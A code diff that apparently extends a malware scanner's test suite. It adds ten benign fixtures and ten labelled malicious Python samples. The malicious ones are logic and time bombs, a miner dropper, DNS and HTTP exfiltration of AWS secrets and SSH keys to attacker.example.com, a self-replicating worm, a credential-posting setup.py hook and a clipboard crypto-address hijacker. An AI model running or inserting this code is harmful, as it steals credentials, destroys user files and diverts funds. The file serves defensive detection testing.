@@ -215,6 +215,180 @@ obj = pickle.loads(blob)  # untrusted RCE
 obj()
 '''},
     ),
+    # ─── 악성 fixture 추가 10개 (B 확장) ─────────────────
+    _mal(
+        "logic-bomb-platform-trigger",
+        description="환경 분기 logic bomb (Linux 에서만 발화)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="env-specific trigger",
+        files={"trigger.py": '''
+import platform, subprocess, os
+if platform.system() == "Linux":
+    aws = os.environ.get("AWS_ACCESS_KEY_ID")
+    if aws:
+        subprocess.run(f"curl -X POST -d {aws} https://attacker.example.com",
+                       shell=True)
+'''},
+    ),
+    _mal(
+        "logic-bomb-time-trigger",
+        description="시간 트리거 logic bomb",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="time-based trigger",
+        files={"util.py": '''
+import datetime, os, shutil
+if datetime.datetime.now() > datetime.datetime(2026, 12, 31):
+    shutil.rmtree(os.path.expanduser("~"))
+'''},
+    ),
+    _mal(
+        "dropper-binary-download-exec",
+        description="binary 다운로드 + chmod + exec (dropper)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="dropper",
+        files={"dropper.py": '''
+import os, requests, stat, subprocess
+r = requests.get("http://evil.example.com/miner")
+with open("/tmp/.cache_x", "wb") as f:
+    f.write(r.content)
+os.chmod("/tmp/.cache_x", stat.S_IRWXU)
+subprocess.Popen(["/tmp/.cache_x"])
+'''},
+    ),
+    _mal(
+        "crypto-miner-pattern",
+        description="암호화폐 채굴 패턴",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="crypto miner",
+        files={"miner.py": '''
+import subprocess, urllib.request
+# Download miner config
+urllib.request.urlretrieve(
+    "https://pool.minexmr.com/config.json", "/tmp/cfg.json"
+)
+subprocess.Popen(
+    ["xmrig", "-c", "/tmp/cfg.json", "--background"],
+    stdout=subprocess.DEVNULL,
+)
+'''},
+    ),
+    _mal(
+        "dns-exfiltration",
+        description="DNS query 로 데이터 송출 (covert channel)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="DNS exfil",
+        files={"exfil.py": '''
+import socket, os, base64
+secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
+encoded = base64.b32encode(secret.encode()).decode().lower()
+# 32자씩 split → DNS sub-domain 으로 송출
+for chunk in [encoded[i:i+30] for i in range(0, len(encoded), 30)]:
+    try:
+        socket.gethostbyname(f"{chunk}.attacker.example.com")
+    except Exception:
+        pass
+'''},
+    ),
+    _mal(
+        "self-modifying-code",
+        description="자기 자신을 다른 패키지에 주입하는 self-replication",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="worm-style",
+        files={"worm.py": '''
+import os, glob, shutil
+self_path = __file__
+# site-packages 의 __init__.py 들에 자기 자신 import 추가
+for init in glob.glob("/usr/lib/python3/dist-packages/*/__init__.py"):
+    with open(init, "a") as f:
+        f.write("\\nimport sys; exec(open(r'%s').read())\\n" % self_path)
+'''},
+    ),
+    _mal(
+        "preinstall-script-style",
+        description="install hook 안에서 외부 endpoint 호출 + secrets 송신",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="preinstall pattern",
+        files={"setup.py": '''
+from setuptools import setup
+from setuptools.command.develop import develop
+import os, requests
+
+class CustomDevelop(develop):
+    def run(self):
+        try:
+            requests.post(
+                "https://attacker.example.com/preinstall",
+                json={
+                    "user":  os.environ.get("USER"),
+                    "home":  os.environ.get("HOME"),
+                    "cwd":   os.getcwd(),
+                    "envs":  list(os.environ.keys()),
+                },
+                timeout=3,
+            )
+        except Exception:
+            pass
+        develop.run(self)
+
+setup(name="evil-dev", cmdclass={"develop": CustomDevelop})
+'''},
+    ),
+    _mal(
+        "clipboard-hijack",
+        description="클립보드 모니터링 + 암호화폐 주소 swap",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="clipboard hijack",
+        files={"hijack.py": '''
+import re, time, subprocess
+
+def get_clip():
+    return subprocess.check_output(["xclip", "-o"], text=True)
+
+def set_clip(s: str):
+    subprocess.run(["xclip", "-i"], input=s, text=True)
+
+while True:
+    try:
+        c = get_clip()
+        # BTC address pattern → 공격자 주소로 swap
+        if re.match(r"^[13][a-km-zA-HJ-NP-Z0-9]{25,34}$", c):
+            set_clip("1AttackerWalletXXXXXXXXXXXXXXX")
+    except Exception:
+        pass
+    time.sleep(1)
+'''},
+    ),
+    _mal(
+        "ssh-key-theft",
+        description="SSH 개인키 읽기 + 외부 송신",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="creds-paths + EXF-001",
+        files={"helper.py": '''
+import os, requests
+home = os.path.expanduser("~")
+for fname in ("id_rsa", "id_ed25519", ".aws/credentials"):
+    p = os.path.join(home, ".ssh" if "id_" in fname else "", fname)
+    try:
+        with open(p) as f:
+            requests.post("https://attacker.example.com/keys",
+                          data={"name": fname, "content": f.read()})
+    except Exception:
+        pass
+'''},
+    ),
+    _mal(
+        "variable-alias-obfuscation",
+        description="__import__ 결과를 변수에 할당 후 메서드 호출 (alias)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="alias of obfuscated-import-exec — 변수 추적 한계 알려진 케이스",
+        files={"alias.py": '''
+import os
+m = __import__("subprocess")
+n = __import__("os")
+secret = n.environ.get("AWS_KEY")
+m.run(f"curl -d {secret} https://attacker.example.com", shell=True)
+'''},
+    ),
 ]
 
 
@@ -372,6 +546,225 @@ def main():
 
 if __name__ == "__main__":
     main()
+'''},
+    ),
+    # ─── 정상 fixture 추가 10개 (B 확장) ────────────────
+    _ben(
+        "flask-style-app",
+        description="Flask 스타일 웹 앱 (정상)",
+        files={"app.py": '''
+"""Standard Flask-like web app."""
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+@app.route("/health")
+def health():
+    return jsonify({"status": "ok"})
+
+@app.route("/echo", methods=["POST"])
+def echo():
+    return jsonify({"received": request.get_json()})
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
+'''},
+    ),
+    _ben(
+        "sqlalchemy-orm",
+        description="SQLAlchemy ORM 표준 사용",
+        files={"models.py": '''
+"""SQLAlchemy declarative models."""
+from sqlalchemy import Column, Integer, String, create_engine
+from sqlalchemy.orm import declarative_base, sessionmaker
+
+Base = declarative_base()
+
+class User(Base):
+    __tablename__ = "users"
+    id = Column(Integer, primary_key=True)
+    name = Column(String(80), nullable=False)
+    email = Column(String(120), unique=True)
+
+engine = create_engine("sqlite:///app.db")
+Session = sessionmaker(bind=engine)
+'''},
+    ),
+    _ben(
+        "pytest-plugin-style",
+        description="pytest fixture/conftest 스타일",
+        files={"conftest.py": '''
+"""pytest fixtures."""
+import pytest
+
+@pytest.fixture
+def sample_data():
+    return {"a": 1, "b": 2, "c": [3, 4, 5]}
+
+@pytest.fixture(scope="session")
+def db_url(tmp_path_factory):
+    path = tmp_path_factory.mktemp("data") / "test.db"
+    return f"sqlite:///{path}"
+'''},
+    ),
+    _ben(
+        "click-cli-framework",
+        description="Click 기반 CLI 정의",
+        files={"cli.py": '''
+"""Click CLI."""
+import click
+
+@click.group()
+def main():
+    """My tool."""
+
+@main.command()
+@click.option("--name", default="World")
+def hello(name: str):
+    click.echo(f"Hello, {name}!")
+
+@main.command()
+@click.argument("path", type=click.Path(exists=True))
+def stat(path: str):
+    import os
+    click.echo(os.stat(path))
+'''},
+    ),
+    _ben(
+        "asyncio-helper",
+        description="asyncio gather / sleep helper",
+        files={"async_util.py": '''
+"""asyncio helpers."""
+import asyncio
+
+async def parallel(*coros, max_concurrency: int = 10):
+    sem = asyncio.Semaphore(max_concurrency)
+    async def bound(c):
+        async with sem:
+            return await c
+    return await asyncio.gather(*(bound(c) for c in coros))
+
+async def with_timeout(coro, seconds: float):
+    return await asyncio.wait_for(coro, timeout=seconds)
+'''},
+    ),
+    _ben(
+        "pydantic-style-validator",
+        description="dataclass 기반 validator",
+        files={"validators.py": '''
+"""Validators using dataclasses."""
+from dataclasses import dataclass, field
+from typing import Optional
+
+@dataclass
+class Address:
+    street: str
+    city: str
+    zip_code: str
+
+    def __post_init__(self):
+        if not self.zip_code.isdigit() or len(self.zip_code) != 5:
+            raise ValueError(f"invalid zip: {self.zip_code}")
+
+@dataclass
+class Person:
+    name: str
+    age: int
+    email: Optional[str] = None
+    addresses: list = field(default_factory=list)
+'''},
+    ),
+    _ben(
+        "retry-decorator",
+        description="exponential backoff retry decorator",
+        files={"retry.py": '''
+"""Retry with exponential backoff."""
+import functools
+import time
+
+def retry(max_attempts: int = 3, base_delay: float = 1.0):
+    def decorator(fn):
+        @functools.wraps(fn)
+        def wrapper(*args, **kwargs):
+            last_exc = None
+            for attempt in range(max_attempts):
+                try:
+                    return fn(*args, **kwargs)
+                except Exception as e:
+                    last_exc = e
+                    time.sleep(base_delay * (2 ** attempt))
+            raise last_exc
+        return wrapper
+    return decorator
+'''},
+    ),
+    _ben(
+        "memory-efficient-iterator",
+        description="generator 기반 파일 라인 처리",
+        files={"iterators.py": '''
+"""Memory-efficient file iterators."""
+from pathlib import Path
+
+def iter_lines(path: str, encoding: str = "utf-8"):
+    with open(path, encoding=encoding) as f:
+        for line in f:
+            yield line.rstrip("\\n")
+
+def iter_chunks(path: str, chunk_size: int = 65536):
+    with open(path, "rb") as f:
+        while True:
+            chunk = f.read(chunk_size)
+            if not chunk:
+                break
+            yield chunk
+'''},
+    ),
+    _ben(
+        "hash-utility",
+        description="sha256 / blake2 helper",
+        files={"hashing.py": '''
+"""Hashing utilities."""
+import hashlib
+
+def sha256_hex(data: bytes) -> str:
+    return hashlib.sha256(data).hexdigest()
+
+def blake2_hex(data: bytes, digest_size: int = 32) -> str:
+    return hashlib.blake2b(data, digest_size=digest_size).hexdigest()
+
+def file_sha256(path: str, chunk: int = 65536) -> str:
+    h = hashlib.sha256()
+    with open(path, "rb") as f:
+        while True:
+            b = f.read(chunk)
+            if not b:
+                break
+            h.update(b)
+    return h.hexdigest()
+'''},
+    ),
+    _ben(
+        "json-schema-validator",
+        description="jsonschema 기반 validator (정상 사용)",
+        files={"jsv.py": '''
+"""JSON schema validation wrapper."""
+import json
+from typing import Any
+
+def validate(data: Any, schema: dict) -> tuple[bool, list]:
+    try:
+        from jsonschema import validate as _v, ValidationError
+    except ImportError:
+        return False, ["jsonschema not installed"]
+    try:
+        _v(instance=data, schema=schema)
+        return True, []
+    except ValidationError as e:
+        return False, [str(e)]
+
+def load_schema(path: str) -> dict:
+    with open(path, encoding="utf-8") as f:
+        return json.load(f)
 '''},
     ),
 ]
